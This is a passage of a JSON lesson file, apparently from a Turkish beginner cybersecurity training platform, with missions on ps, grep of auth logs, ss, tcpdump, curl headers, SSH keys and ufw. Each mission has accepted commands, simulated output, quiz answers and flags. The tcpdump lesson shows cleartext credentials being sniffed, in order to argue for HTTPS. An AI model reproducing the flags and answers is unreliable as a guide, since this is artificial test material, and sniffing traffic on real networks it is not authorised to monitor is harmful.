        "acceptedCommands": [
            "ps aux",
            "ps -ef",
            "ps -aux"
        ],
        "hintExplanation": "<p><strong>ps:</strong> Process Status (Süreç Durumu) kelimelerinin kısaltmasıdır.</p><p><strong>aux parametreleri:</strong> a: tüm kullanıcıların süreçleri, u: kullanıcı adlarıyla detaylı gösterim, x: terminale bağlı olmayan arka plan servislerini listeler.</p>",
        "terminalSuccessOutput": "USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot           1  0.0  0.1 168432 11244 ?        Ss   08:00   0:01 /sbin/init splash\nroot         482  0.0  0.2  72304 18210 ?        S    08:01   0:00 /usr/sbin/sshd -D\nanalyst     1337  4.2  1.8 340212 94210 pts/0    S+   09:12   0:03 python3 /opt/monitor.py\n[TEBRİKLER!] Sistemdeki aktif süreç tablosu başarıyla döküldü!\n[BİLGİ] PID 1337 numaralı Python izleme sürecinin çalıştığını tespit ettiniz.\n[FLAG] LFL{starter_ps_aux_pid_process_mastery}",
        "flag": "LFL{starter_ps_aux_pid_process_mastery}",
        "nextId": "starter-12",
        "whyWeUse": "Bir bilgisayara zararlı bir yazılım (malware) veya arka kapı bulaştığında, bu yazılım mutlaka bellekte (RAM) çalışan bir **Süreç (Process)** olarak görünür. Windows'ta Görev Yöneticisi'ni açmak yerine Linux'ta `ps aux` komutunu çalıştırarak o anda sistemde hangi kullanıcının hangi programı çalıştırdığını ve programın **PID (Kimlik Numarası)** değerini anında tespit ederiz.",
        "cmdAnatomy": [
            {
                "token": "ps",
                "role": "Ana Komut (Process Status)",
                "desc": "Sistemde çalışan süreçlerin (programların) anlık fotoğrafını çeken komuttur."
            },
            {
                "token": "aux",
                "role": "Birleşik Parametreler (a, u, x)",
                "desc": "• `a`: Sadece benim değil, tüm kullanıcıların çalıştırdığı programları göster\n• `u`: Programı hangi kullanıcının çalıştırdığını ve CPU/RAM oranlarını göster\n• `x`: Bir pencereye bağlı olmadan arka planda sessizce çalışan servisleri de göster."
            }
        ],
        "outputGuide": [
            {
                "snippet": "USER PID %CPU %MEM ... COMMAND",
                "meaning": "Tablo sütunları: `USER` (Kim çalıştırdı), `PID` (Programın kimlik numarası), `%CPU/%MEM` (Kaynak kullanımı) ve `COMMAND` (Çalışan komutun tam yolu)."
            },
            {
                "snippet": "root 482 ... /usr/sbin/sshd -D",
                "meaning": "`482` numaralı PID ile `root` tarafından çalıştırılan resmi SSH sunucu servisi."
            },
            {
                "snippet": "analyst 1337 4.2 1.8 ... python3 /opt/monitor.py",
                "meaning": "**Bulgu!** `analyst` kullanıcısı `1337` PID numarasıyla `/opt/monitor.py` adlı bir Python scripti çalıştırıyor. Eğer bu script zararlıysa `kill -9 1337` ile anında durdurabiliriz!"
            }
        ],
        "beginnerTerms": [
            {
                "term": "Process (Süreç)",
                "desc": "Diskte duran bir programın çalıştırılarak RAM bellekte aktif hale gelmiş canlı halidir."
            },
            {
                "term": "PID (Process ID)",
                "desc": "Çalışan her programa işletim sisteminin verdiği benzersiz numaradır (Örn: 1337). Programı durdurmak (`kill`) için bu numara kullanılır."
            }
        ],
        "quickCheck": {
            "question": "`ps aux` çıktısında zararlı bir programın PID numarasının `1337` olduğunu gördün. Bu programı nasıl durdurursun?",
            "options": [
                "`kill -9 1337` komutuyla PID numarasını hedef alarak",
                "Monitörü kapatıp açarak",
                "`ls -la` yazarak"
            ],
            "answer": 0,
            "explanation": "Doğru! `ps aux` ile programın PID numarasını buluruz, ardından `kill -9 <PID>` komutuyla işletim sistemi çekirdeğine o süreci derhal sonlandırma emri veririz."
        }
    },
    {
        "id": "starter-12",
        "track": "starter",
        "title": "Metin Arama & Log Analizi: grep, Pipe (|) ve Çıktı Yönlendirme",
        "level": "0. Temel Altyapı",
        "badge": "LOG FILTERING & GREP PIPELINE",
        "theory": "### Siber Güvenlikçinin En Büyük Silahı: Log Filtreleme\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nÖnünüze 500 sayfalık kalın bir telefon rehberi konduğunu hayal edin. 'Mehmet' ismini aramak için sayfaları tek tek çevirmek yerine, elinizdeki sihirli bir büyüteci rehberin üzerine tuttuğunuzda yalnızca içinde 'Mehmet' geçen satırların parlaması gibidir. `grep` tam olarak bu sarı fosforlu büyüteçtir.\n\n#### Boru Hattı (| Pipe) Mantığı:\nLinux'ta bir komutun çıktısını diğer komuta girdi olarak vermek için `|` (pipe) karakteri kullanılır:\n* `cat access.log | grep \"404\"` ➔ Log dosyasını oku, içinden sadece 404 içeren satırları süz.\n* `grep -i \"admin\" /etc/passwd` ➔ Büyük/küçük harf duyarsız arama yapar.",
        "mission": "/var/log/auth.log dosyasında başarısız oturum açma denemelerini bulmak için grep 'Failed' /var/log/auth.log komutunu çalıştırın.",
        "expectedCommand": "grep 'Failed' /var/log/auth.log",
        "acceptedCommands": [
            "grep 'Failed' /var/log/auth.log",
            "grep \"Failed\" /var/log/auth.log",
            "grep Failed /var/log/auth.log",
            "cat /var/log/auth.log | grep Failed",
            "cat /var/log/auth.log | grep 'Failed'"
        ],
        "hintExplanation": "<p><strong>grep:</strong> Metin dosyaları veya komut çıktıları içinde regex ve anahtar kelime araması yapar.</p><p><strong>'Failed':</strong> Aranan kelime filtresidir.</p><p><strong>/var/log/auth.log:</strong> Linux sistemlerde kimlik doğrulama ve giriş loglarının tutulduğu standart dosyadır.</p>",
        "terminalSuccessOutput": "May 20 04:12:01 server sshd[8492]: Failed password for invalid user admin from 192.168.1.105 port 44322 ssh2\nMay 20 04:12:04 server sshd[8495]: Failed password for invalid user root from 192.168.1.105 port 44324 ssh2\nMay 20 04:12:08 server sshd[8498]: Failed password for invalid user test from 192.168.1.105 port 44326 ssh2\n[ALARM!] 192.168.1.105 IP adresinden kaba kuvvet (Brute-Force) saldırı izi filtrelendi!\n[TEBRİKLER!] Log analizi ve grep ile ilk siber tehdit kanıtını buldunuz!\n[FLAG] LFL{starter_grep_log_analysis_detective}",
        "flag": "LFL{starter_grep_log_analysis_detective}",
        "nextId": "starter-13",
        "whyWeUse": "Bir sunucuya yapılan şifre deneme (Brute-Force) saldırıları `/var/log/auth.log` dosyasına kaydedilir. Ancak bu dosyada on binlerce normal satır vardır. Saldırganın IP adresini ve hangi kullanıcılara girmeye çalıştığını 1 saniyede yakalamak için `grep 'Failed' /var/log/auth.log` komutuyla sadece **başarısız parola denemelerini** cımbızla çekip çıkarırız.",
        "cmdAnatomy": [
            {
                "token": "grep",
                "role": "Ana Komut (Metin Avcısı)",
                "desc": "Dosya içinde belirttiğimiz kelimeyi arayıp sadece eşleşen satırları ekrana getiren filtreleme aracıdır."
            },
            {
                "token": "'Failed'",
                "role": "Aranan Kelime",
                "desc": "Başarısız giriş denemelerinde geçen `Failed` (Başarısız oldu) anahtar kelimesidir."
            },
            {
                "token": "/var/log/auth.log",
                "role": "Hedef Log Dosyası",
                "desc": "Linux'ta tüm kullanıcı girişlerinin ve SSH parola denemelerinin kaydedildiği güvenlik kamerası dosyasıdır."
            }
        ],
        "outputGuide": [
            {
                "snippet": "Failed password for invalid user admin from 192.168.1.105 port 44322 ssh2",
                "meaning": "`192.168.1.105` IP adresindeki saldırganın SSH üzerinden `admin`, `root` ve `test` kullanıcılarına art arda yanlış şifre denediğini (Brute-Force saldırısı) kanıtlayan satırdır!"
            }
        ],
        "beginnerTerms": [
            {
                "term": "/var/log/auth.log",
                "desc": "Linux sistemlerde kimlik doğrulama (Authentication), sudo kullanımı ve SSH giriş kayıtlarının tutulduğu log dosyasıdır."
            },
            {
                "term": "Brute-Force (Kaba Kuvvet Saldırısı)",
                "desc": "Saldırganın otomatik bir programla saniyede yüzlerce farklı parola deneyerek hesabı kırmaya çalışmasıdır."
            }
        ],
        "quickCheck": {
            "question": "Bir Linux sunucuda birisinin SSH şifremizi kırmaya çalışıp çalışmadığını hangi dosyada `grep` yaparak anlarız?",
            "options": [
                "`/var/log/auth.log` dosyasında `'Failed'` kelimesini aratarak",
                "`/etc/hostname` dosyasına bakarak",
                "Hesap makinesini açarak"
            ],
            "answer": 0,
            "explanation": "Harika! `/var/log/auth.log` tüm giriş denemelerini kaydeder ve `Failed password` satırları saldırganın IP adresini doğrudan ele verir."
        }
    },
    {
        "id": "starter-13",
        "track": "starter",
        "title": "Ağ Bağlantıları ve Dinleyen Portlar: netstat ve ss Komutları",
        "level": "0. Temel Altyapı",
        "badge": "SOCKETS & LISTENING PORTS",
        "theory": "### Makinede Hangi Gizli Kapılar Açık? Socket Analizi\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBir otelin resepsiyonuna geçip hangi odaların dolu olduğunu, hangi kapılardan ses geldiğini ve hangi misafirlerin dışarıyla telefon görüşmesi yaptığını gösteren santral panosuna bakmak gibidir. Bilgisayarınızın dış dünyayla kurduğu her bağlantı bir 'Socket' oluşturur.\n\n#### ss (Socket Statistics) Komutu:\nEski `netstat` aracının modern ve ultra hızlı halidir:\n* `-t`: TCP soketlerini göster.\n* `-u`: UDP soketlerini göster.\n* `-l`: Sadece dinleyen (LISTEN durumundaki) açık servis kapılarını listele.\n* `-p`: Hangi programın/prosesin bu portu dinlediğini göster.\n* `-n`: DNS çözmeden sayısal IP ve port olarak listele.",
        "mission": "Sistemde dinleme durumunda olan tüm TCP soketlerini ve port numaralarını listelemek için ss -tln komutunu çalıştırın.",
        "expectedCommand": "ss -tln",
        "acceptedCommands": [
            "ss -tln",
            "ss -tuln",
            "ss -tlpn",
            "netstat -tln",
            "netstat -tuln",
            "ss -lnt"
        ],
        "hintExplanation": "<p><strong>ss:</strong> Socket Statistics komutudur.</p><p><strong>-t:</strong> Sadece TCP trafiğine odaklanır.</p><p><strong>-l:</strong> Sadece LISTEN (gelen bağlantıları bekleyen) portları filtreler.</p><p><strong>-n:</strong> Servis isimleri yerine sayısal portları (Örn: http yerine 80) gösterir.</p>",
        "terminalSuccessOutput": "State      Recv-Q Send-Q   Local Address:Port    Peer Address:Port\nLISTEN     0      128            0.0.0.0:22           0.0.0.0:*\nLISTEN     0      511          127.0.0.1:3306         0.0.0.0:*\nLISTEN     0      512            0.0.0.0:80           0.0.0.0:*\nLISTEN     0      128            0.0.0.0:443          0.0.0.0:*\n[ANALİZ RAPORU]\n* Port 22 (SSH) dış dünyaya açık.\n* Port 80 (HTTP) ve Port 443 (HTTPS) web isteklerini kabul ediyor.\n* Port 3306 (MySQL) güvenli şekilde yalnızca 127.0.0.1 (Localhost) üzerinde dinliyor.\n[FLAG] LFL{starter_ss_sockets_listening_ports_exposed}",
        "flag": "LFL{starter_ss_sockets_listening_ports_exposed}",
        "nextId": "starter-14",
        "whyWeUse": "Bir sunucuda hangi servislerin sadece bilgisayarın kendi içine (`127.0.0.1`), hangilerinin ise tüm internete (`0.0.0.0`) açık olduğunu ayırt etmek hayati önem taşır. Örneğin bir veritabanı (`3306`) yanlışlıkla `0.0.0.0` adresinde dinliyorsa dünyadaki herkes veritabanına saldırabilir! `ss -tln` komutuyla tüm TCP dinleme soketlerini kontrol edip güvenlik sınırlarını doğrularız.",
        "cmdAnatomy": [
            {
                "token": "ss",
                "role": "Ana Komut (Socket Statistics)",
                "desc": "Sistemdeki ağ soketlerini ve bağlantı durumlarını listeler."
            },
            {
                "token": "-tln",
                "role": "Birleşik Parametreler (-t -l -n)",
                "desc": "• `-t`: Sadece TCP bağlantı kapılarını göster\n• `-l`: Sadece dinlemede (`LISTEN`) olan açık kapıları göster\n• `-n`: İsim çevirisi yapmadan doğrudan port numaralarını (`22`, `80`, `3306`) sayısal olarak göster."
            }
        ],
        "outputGuide": [
            {
                "snippet": "LISTEN ... 0.0.0.0:22, 80, 443",
                "meaning": "SSH (22) ve Web (80, 443) servisleri `0.0.0.0` üzerinde dinliyor; yani dış ağdan gelen bağlantılara açıklar."
            },
            {
                "snippet": "LISTEN ... 127.0.0.1:3306",
                "meaning": "**Kritik Güvenlik Doğrulaması:** MySQL veritabanı (`3306`) sadece `127.0.0.1` (Localhost) üzerinde dinliyor. Yani dışarıdan bir hacker bu porta bağlanamaz, sadece sunucunun kendi içindeki web sitesi erişebilir!"
            }
        ],
        "beginnerTerms": [
            {
                "term": "Socket (Soket)",
                "desc": "Bir IP adresi ile bir Port numarasının birleşimidir (Örn: 127.0.0.1:3306)."
            },
            {
                "term": "Localhost (127.0.0.1) İzolasyonu",
                "desc": "Veritabanı gibi hassas servislerin dış ağa kapatılıp sadece makinenin kendi içinden erişilebilir yapılmasıdır."
            }
        ],
        "quickCheck": {
            "question": "Bir sunucudaki MySQL veritabanı portunun (`3306`) `0.0.0.0:3306` yerine `127.0.0.1:3306` olarak görünmesi neden iyi bir şeydir?",
            "options": [
                "Çünkü 127.0.0.1 sadece sunucunun kendi içinden erişime izin verir, dışarıdaki hackerların veritabanına doğrudan bağlanmasını engeller",
                "Çünkü veritabanının silindiğini gösterir",
                "Çünkü internetin kapandığını gösterir"
            ],
            "answer": 0,
            "explanation": "Tam isabet! Veritabanları asla dış internete (`0.0.0.0`) açık bırakılmamalı, `127.0.0.1` (localhost) üzerinde izole edilmelidir."
        }
    },
    {
        "id": "starter-14",
        "track": "starter",
        "title": "Paketlerin Röntgeni: Ağ Trafiği Yakalama (tcpdump & Wireshark)",
        "level": "0. Temel Altyapı",
        "badge": "PACKET SNIFFING & TCPDUMP",
        "theory": "### Kablodan Akan Her Baytı Dinlemek: Paket Yakalama (Sniffing)\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nPostanede çalışan bir görevlinin, masasının üzerinden geçen mektupları teker teker açıp içindeki yazıları gizlice okuması gibidir. Eğer mektup şifreli (HTTPS / TLS) yazılmamışsa, içindeki kullanıcı adı, parola ve mesajlar apaçık okunur.\n\n#### tcpdump Nedir?\nKomut satırından ağ kartından geçen ham paketleri canlı olarak yakalayan efsanevi araçtır:\n* `-i eth0`: eth0 ağ kartını dinle.\n* `-c 3`: Sadece 3 adet paket yakala ve dur.\n* `-A`: Paket yükünü (Payload) ASCII metin olarak ekrana dök.\n* `port 80`: Yalnızca HTTP trafiğini filtrele.",
        "mission": "eth0 ağ arayüzünden 3 adet HTTP paketini ASCII metin olarak yakalamak için tcpdump -i eth0 -c 3 -A 'port 80' komutunu çalıştırın.",
        "expectedCommand": "tcpdump -i eth0 -c 3 -A 'port 80'",
        "acceptedCommands": [
            "tcpdump -i eth0 -c 3 -A 'port 80'",
            "tcpdump -i eth0 -c 3 -A port 80",
            "tcpdump -i eth0 -c 3",
            "tcpdump -c 3 -i eth0 -A 'port 80'"
        ],
        "hintExplanation": "<p><strong>tcpdump:</strong> Canlı ağ dinleme aracıdır.</p><p><strong>-i eth0:</strong> Dinlenecek ethernet kartını seçer.</p><p><strong>-c 3:</strong> 3 paket yakalayınca komutu sonlandırır.</p><p><strong>-A:</strong> Paket içeriğindeki metinleri (ASCII) gösterir.</p>",
        "terminalSuccessOutput": "listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes\n09:42:15.102381 IP 10.0.2.15.54122 > 192.168.1.1.80: Flags [P.], seq 1:180, ack 1\nPOST /login.php HTTP/1.1\nHost: secure-portal.local\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 35\n\nusername=admin&password=SuperSecretPassword2026!\n\n3 packets captured, 3 packets received by filter, 0 packets dropped by kernel\n[İSTİHBARAT] HTTP şifresiz olduğu için açık metin parola (SuperSecretPassword2026!) havada yakalandı!\n[GÜVENLİK KURALI] Bu yüzden modern internette daima HTTPS (TLS 1.3) kullanılmalıdır.\n[FLAG] LFL{starter_tcpdump_cleartext_traffic_intercepted}",
        "flag": "LFL{starter_tcpdump_cleartext_traffic_intercepted}",
        "nextId": "starter-15",
        "whyWeUse": "'Neden şifresiz HTTP sitelere şifre yazmamalıyız?' sorusunun canlı kanıtı bu odadadır! Ağ kablosundan geçen paketleri `tcpdump` ile dinlediğimizde, eğer iletişim şifresiz (`port 80` / HTTP) ise paketlerin içindeki kullanıcı adı ve parolaların **hiçbir şifreleme olmadan düz yazı (ASCII) halinde** havada uçuştuğunu kendi gözlerimizle görürüz.",
        "cmdAnatomy": [
            {
                "token": "tcpdump",
                "role": "Ana Komut (Paket Yakalayıcı)",
                "desc": "Ağ kartından geçen veri paketlerini canlı olarak yakalayan analiz aracıdır."
            },
            {
                "token": "-i eth0",
                "role": "Parametre (Interface / Ağ Kartı)",
                "desc": "Hangi ağ kartının dinleneceğini (`eth0`) belirtir."
            },
            {
                "token": "-c 3",
                "role": "Parametre (Count / Paket Sayısı)",
                "desc": "Sadece 3 adet paket yakalayıp otomatik durmasını sağlar."
            },
            {
                "token": "-A",
                "role": "Parametre (ASCII Metin Modu)",
                "desc": "Paketin içindeki verileri (Payload) insanların okuyabileceği düz yazı olarak ekrana basar."
            },
            {
                "token": "'port 80'",
                "role": "Filtre (Sadece HTTP Trafiği)",
                "desc": "Gereksiz tüm trafiği yoksayıp sadece 80 numaralı şifresiz web kapısından geçen paketleri yakalar."
            }
        ],
        "outputGuide": [
            {
                "snippet": "IP 10.0.2.15.54122 > 192.168.1.1.80: POST /login.php",
                "meaning": "`10.0.2.15` adresindeki kullanıcının `192.168.1.1` sunucusundaki `/login.php` giriş sayfasına form verisi (`POST`) gönderdiğini gösterir."
            },
            {
                "snippet": "username=admin&password=SuperSecretPassword2026!",
                "meaning": "**Şok Edici Kanıt!** Bağlantı HTTPS (443) yerine şifresiz HTTP (80) olduğu için kullanıcının yazdığı parola (`SuperSecretPassword2026!`) ağ dinlemesinde apaçık yakalandı!"
            }
        ],
        "beginnerTerms": [
            {
                "term": "Packet Sniffing (Paket Koklama)",
                "desc": "Ağ üzerinden geçen veri paketlerini yakalayıp içeriğini inceleme işlemidir."
            },
            {
                "term": "Cleartext (Açık Metin)",
                "desc": "Şifrelenmemiş, ağın ortasında dinleme yapan herkesin doğrudan okuyabileceği düz metin veridir."
            }
        ],
        "quickCheck": {
            "question": "`tcpdump` komutundaki `-A` parametresi bize ne sağladı?",
            "options": [
                "Yakalanan paketin içindeki veriyi (kullanıcı adı ve şifreyi) okunabilir düz metin (ASCII) olarak ekrana döktü",
                "Paketi şifreledi",
                "Ağ kartını kapattı"
            ],
            "answer": 0,
            "explanation": "Doğru! `-A` (ASCII) parametresi paketin içindeki ham baytları metne çevirerek HTTP üzerinden gönderilen açık parolayı okumamızı sağladı."
        }
    },
    {
        "id": "starter-15",
        "track": "starter",
        "title": "Web Uygulama Anatomisi: Cookie, Session & curl ile Başlık Analizi",
        "level": "0. Temel Altyapı",
        "badge": "WEB SESSIONS & HTTP HEADERS",
        "theory": "### Web Siteleri Sizi Nasıl Tanır? Durumsuz (Stateless) HTTP Çözümü\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBir sinema gişesinden bilet aldığınızda gişe memuru yüzünüzü 5 dakika sonra unutur. Ancak kapıdaki görevliye biletinizi (Session Cookie) gösterirseniz salona girmenize izin verir. Web sunucuları da böyledir; her yeni istekte sizi unutur, ta ki tarayıcınız sunucuya 'Bak bu benim oturum çerezim' diyene kadar.\n\n#### Kritik Çerez Güvenlik Bayrakları:\n* **HttpOnly:** JavaScript'in (XSS saldırılarının) çerezi okumasını engeller.\n* **Secure:** Çerezin yalnızca HTTPS şifreli tünelden gönderilmesini şart koşar.\n* **SameSite=Strict:** Başka sitelerin kullanıcının adına istek atmasını (CSRF) engeller.",
        "mission": "curl -I https://bank.lfl.local komutunu kullanarak sunucunun gönderdiği HTTP başlıklarını ve çerez yapılandırmasını inceleyin.",
        "expectedCommand": "curl -I https://bank.lfl.local",
        "acceptedCommands": [
            "curl -I https://bank.lfl.local",
            "curl -i https://bank.lfl.local",
            "curl -I http://bank.lfl.local",
            "curl -I --head https://bank.lfl.local"
        ],
        "hintExplanation": "<p><strong>curl:</strong> Komut satırından URL'lere istek atan güçlü web istemcisidir.</p><p><strong>-I (Head):</strong> Sayfa içeriğini (HTML) değil, yalnızca HTTP sunucu yanıt başlıklarını (Headers) çeker.</p>",
        "terminalSuccessOutput": "HTTP/2 200 OK\ndate: Thu, 08 Nov 2026 18:14:22 GMT\nserver: Kestrel\ncontent-type: text/html; charset=utf-8\nset-cookie: session_token=abc98124fa10e; Path=/; Secure; HttpOnly; SameSite=Strict\nstrict-transport-security: max-age=31536000; includeSubDomains; preload\nx-frame-options: DENY\nx-content-type-options: nosniff\n\n[ANALİZ] Sunucu HttpOnly, Secure ve SameSite bayraklarını kusursuz uygulamış!\n[ÖĞRENİLEN DERS] Oturum çerezleri güvende olduğunda XSS saldırganları token'ı çalamaz.\n[FLAG] LFL{starter_curl_session_cookie_security_master}",
        "flag": "LFL{starter_curl_session_cookie_security_master}",
        "nextId": "starter-16",
        "whyWeUse": "Bir web sitesine giriş yaptıktan sonra sayfalar arasında gezerken sitenin bizi tanımasını sağlayan şey **Oturum Çerezi (Session Cookie)**'dir. Eğer bir hacker bizim çerezimizi çalarsa şifremizi bilmeden hesabımıza girebilir! Bir web sitesinin çerezlerini `HttpOnly` ve `Secure` kalkanlarıyla koruyup korumadığını denetlemek için `curl -I` ile `set-cookie` başlığını inceleriz.",
        "cmdAnatomy": [
            {
                "token": "curl",
                "role": "Ana Komut",
                "desc": "Komut satırından hedef web sunucusuna istek gönderen araçtır."
            },
            {
                "token": "-I",
                "role": "Parametre (Sadece Başlıklar)",
                "desc": "Sunucunun gönderdiği HTTP yanıt başlıklarını ve `set-cookie` ayarlarını çeker."
            },
            {
                "token": "https://bank.lfl.local",
                "role": "Hedef Web Adresi",
                "desc": "Çerez güvenliğini denetlediğimiz banka uygulamasının adresidir."
            }
        ],
        "outputGuide": [
            {
                "snippet": "set-cookie: session_token=abc98124fa10e; Path=/; Secure; HttpOnly; SameSite=Strict",
                "meaning": "Sunucunun tarayıcıya verdiği oturum kartıdır:\n• **Secure:** Sadece şifreli HTTPS üzerinden gönderilir.\n• **HttpOnly:** Zararlı JavaScript kodlarının (XSS) bu çerezi çalmasını engeller.\n• **SameSite=Strict:** Başka sitelerden yapılan sahte istekleri (CSRF) engeller."
            }
        ],
        "beginnerTerms": [
            {
                "term": "Session Cookie (Oturum Çerezi)",
                "desc": "Giriş yaptıktan sonra sunucunun sizi tanıması için tarayıcınıza verdiği dijital giriş biletidir."
            },
            {
                "term": "HttpOnly Bayrağı",
                "desc": "Çerezin JavaScript (`document.cookie`) ile okunmasını yasaklayarak XSS ile hesap çalınmasını önleyen güvenlik bayrağıdır."
            }
        ],
        "quickCheck": {
            "question": "Bir oturum çerezinde (Cookie) `HttpOnly` bayrağının bulunması hangi saldırıyı engeller?",
            "options": [
                "Saldırganın XSS (JavaScript) kodu çalıştırarak kullanıcının oturum çerezini çalmasını engeller",
                "Elektrik kesintisini engeller",
                "Kullanıcının şifresini unutmasını engeller"
            ],
            "answer": 0,
            "explanation": "Harika! `HttpOnly` bayrağı tarayıcıya 'Bu çereze JavaScript kodlarının dokunmasına asla izin verme' der."
        }
    },
    {
        "id": "starter-16",
        "track": "starter",
        "title": "Güvenli Uzak Bağlantı: SSH (Secure Shell) ve Anahtar Çiftleri",
        "level": "0. Temel Altyapı",
        "badge": "SSH KEYS & SECURE REMOTE ACCESS",
        "theory": "### Parolalara Veda: Asimetrik Kriptografi ile SSH\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nKlasik parola kullanmak kapıya 4 haneli şifreli kilit takmak gibidir; biri omzunuzun üzerinden bakarsa şifreyi öğrenir. SSH Anahtar Çifti (Public/Private Key) ise şöyledir: Kapıya akıllı bir asma kilit (Public Key) takarsınız. O kilidi yalnızca sizin cebinizdeki benzersiz parmak izli elektronik anahtarınız (Private Key) açabilir.\n\n#### SSH Anahtar Mimarisi:\n* **id_rsa (Private Key):** SADECE sizde kalır. Asla kimseye verilmez, chmod 600 ile korunmalıdır.\n* **id_rsa.pub (Public Key):** Dünyadaki tüm sunucuların `~/.ssh/authorized_keys` dosyasına eklenebilir.\n* **Port 22:** Standart SSH iletişim portudur; trafiğin tamamı uçtan uca AES ile şifrelenir.",
        "mission": "Özel kimlik anahtarını kullanarak güvenli analist sunucusuna bağlanmak için ssh -i ~/.ssh/id_rsa analyst@10.10.10.20 komutunu çalıştırın.",
        "expectedCommand": "ssh -i ~/.ssh/id_rsa analyst@10.10.10.20",
        "acceptedCommands": [
            "ssh -i ~/.ssh/id_rsa analyst@10.10.10.20",
            "ssh analyst@10.10.10.20 -i ~/.ssh/id_rsa",
            "ssh analyst@10.10.10.20"
        ],
        "hintExplanation": "<p><strong>ssh:</strong> Secure Shell uzak bağlantı komutudur.</p><p><strong>-i:</strong> Bağlantıda kullanılacak özel anahtar dosyasını (Identity File) belirtir.</p><p><strong>analyst@10.10.10.20:</strong> Bağlanılacak hedef kullanıcı ve IP adresidir.</p>",
        "terminalSuccessOutput": "The authenticity of host '10.10.10.20 (10.10.10.20)' can't be established.\nED25519 key fingerprint is SHA256:d8Q+9k23JLx7bE0v2A+mBq5...\nAuthenticating with public key \"analyst@lfl-workstation\"\nWelcome to Ubuntu 24.04 LTS (GNU/Linux 6.8.0-31-generic x86_64)\nanalyst@lfl-bastion:~$ whoami\nanalyst\n[BAĞLANTI BAŞARILI] Parolasız, kırılması imkansız 4096-bit RSA anahtarıyla güvenli oturum açıldı!\n[FLAG] LFL{starter_ssh_asymmetric_keypair_authentication}",
        "flag": "LFL{starter_ssh_asymmetric_keypair_authentication}",
        "nextId": "starter-17",
        "whyWeUse": "Sunuculara uzaktan bağlanırken normal parola kullanmak risklidir; çünkü saldırganlar parolayı tahmin edebilir (Brute-Force). Bunun yerine siber güvenlik uzmanları **SSH Anahtar Çifti (`id_rsa` Özel Anahtar)** kullanır. Cebimizdeki bu kriptografik anahtar dosyasıyla sunucuya parolasız ve kırılması imkansız bir şifreli tünelle bağlanmak için `ssh -i` komutunu kullanırız.",
        "cmdAnatomy": [
            {
                "token": "ssh",
                "role": "Ana Komut (Secure Shell)",
                "desc": "Uzak bir Linux sunucuya güvenli ve şifreli bağlantı kuran komuttur."
            },
            {
                "token": "-i",
                "role": "Parametre (Identity File / Anahtar Dosyası)",
                "desc": "Parola yerine hangi özel kriptografik anahtar dosyasını kullanacağımızı belirtir."
            },
            {
                "token": "~/.ssh/id_rsa",
                "role": "Özel Anahtar Yolu (Private Key)",
                "desc": "Kendi bilgisayarımızdaki gizli `.ssh` klasöründe duran özel anahtar dosyamızdır."
            },
            {
                "token": "analyst@10.10.10.20",
                "role": "Kullanıcı@Hedef_IP",
                "desc": "`10.10.10.20` adresindeki sunucuya `analyst` kullanıcı hesabıyla bağlanacağımızı belirtir."
            }
        ],
        "outputGuide": [
            {
                "snippet": "Authenticating with public key \"analyst@lfl-workstation\"",
                "meaning": "Sunucunun parolaya ihtiyaç duymadan özel RSA anahtarımızı doğruladığını gösterir."
            },
            {
                "snippet": "analyst@lfl-bastion:~$ whoami -> analyst",
                "meaning": "Artık kendi bilgisayarımızda değil, uzaktaki `lfl-bastion` sunucusunun içindeyiz!"
            }
        ],
        "beginnerTerms": [
            {
                "term": "Private Key (id_rsa)",
                "desc": "Sadece sizde bulunan ve asla kimseyle paylaşılmayan gizli dijital anahtardır."
            },
            {
                "term": "Public Key (id_rsa.pub)",
                "desc": "Bağlanmak istediğiniz sunucuya konulan kilit karşılığıdır; özel anahtarınız bu kilidi açar."
            }
        ],
        "quickCheck": {
            "question": "`ssh -i ~/.ssh/id_rsa analyst@10.10.10.20` komutundaki `-i` parametresi ne işe yarar?",
            "options": [
                "Bağlantı sırasında parola yerine kullanılacak Özel Anahtar (Identity / Private Key) dosyasını seçer",
                "Bağlantıyı iptal eder",
                "Hedef sunucuyu siler"
            ],
            "answer": 0,
            "explanation": "Doğru! `-i` (identity file) parametresi SSH bağlantısında kullanılacak özel anahtar dosyasını (`id_rsa`) belirtir."
        }
    },
    {
        "id": "starter-17",
        "track": "starter",
        "title": "Güvenlik Duvarı (Firewall) Temelleri: ufw ve iptables ile Savunma",
        "level": "0. Temel Altyapı",
        "badge": "FIREWALL RULES & PACKET FILTERING",
        "theory": "### Kalenin Kapısını Koruyan Nöbetçi: Güvenlik Duvarı\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBir rezidansın nizamiyesindeki güvenlik görevlisidir. Gelen her araca 'Kimi ziyarete geldin? Plakan ne?' diye sorar. Listedeki daire numarasına (Port 80/443) gidiyorsa bariyeri kaldırır (ALLOW). Kara listedeki bir araçsa (Saldırgan IP) içeri sokmaz ve kapıdan kovar (DROP/DENY).\n\n#### Linux Güvenlik Duvarı (UFW - Uncomplicated Firewall):\n* **ufw status:** Mevcut güvenlik kurallarını ve durumunu listeler.\n* **ufw allow 22/tcp:** 22 numaralı SSH portunu tüm dünyaya açar.\n* **ufw deny from [IP]:** Belirtilen saldırgan IP'sinden gelen tüm istekleri sessizce çöpe atar.",
        "mission": "198.51.100.55 adresinden gelen saldırgan trafiğini engellemek için ufw deny from 198.51.100.55 komutunu çalıştırın.",
        "expectedCommand": "ufw deny from 198.51.100.55",
        "acceptedCommands": [
            "ufw deny from 198.51.100.55",
            "sudo ufw deny from 198.51.100.55",
            "iptables -A INPUT -s 198.51.100.55 -j DROP"
        ],
        "hintExplanation": "<p><strong>ufw:</strong> Linux'un kolay yönetilebilir güvenlik duvarı aracıdır.</p><p><strong>deny from:</strong> Belirtilen kaynaktan gelen tüm bağlantı isteklerini reddeder.</p><p><strong>198.51.100.55:</strong> Saldırganın kaynak IP adresidir.</p>",
